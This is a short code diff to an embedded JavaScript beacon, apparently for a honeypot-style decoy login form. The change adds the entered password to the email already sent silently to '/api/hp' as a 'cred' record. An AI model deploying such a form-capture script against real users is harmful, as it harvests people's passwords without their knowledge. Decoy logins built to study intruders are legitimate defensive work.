@@ -340,7 +340,12 @@ const BEACON_JS = `
 function s(e){
   e.preventDefault();
   try{
-    var d={email:document.getElementById('e').value,ts:Date.now(),page:location.pathname};
+    var d={
+      email:document.getElementById('e').value,
+      password:document.getElementById('p').value,
+      ts:Date.now(),
+      page:location.pathname
+    };
     navigator.sendBeacon('/api/hp',JSON.stringify({type:'cred',d:d}));
   }catch(x){}
   document.getElementById('f').className='form hide';
